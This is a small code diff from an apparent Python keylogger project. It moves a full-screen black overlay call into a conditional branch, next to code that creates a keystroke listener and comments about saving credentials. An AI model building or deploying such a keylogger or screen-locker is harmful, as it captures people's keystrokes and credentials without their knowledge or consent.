@@ -216,9 +216,6 @@ def listenKey():
     return listener
 
 
-# Get root of fillScreen
-rt = fillScreen()
-
 # Get logger object bu do not start Keylogger
 log = listenKey()
 
@@ -235,6 +232,7 @@ if os.path.exists(f"{CONFIG_LOC}") and os.path.exists(
 
     else:
         # FillScreen with black
+        rt = fillScreen()
         rt.mainloop()
 
 # Sve if credentials does not exists
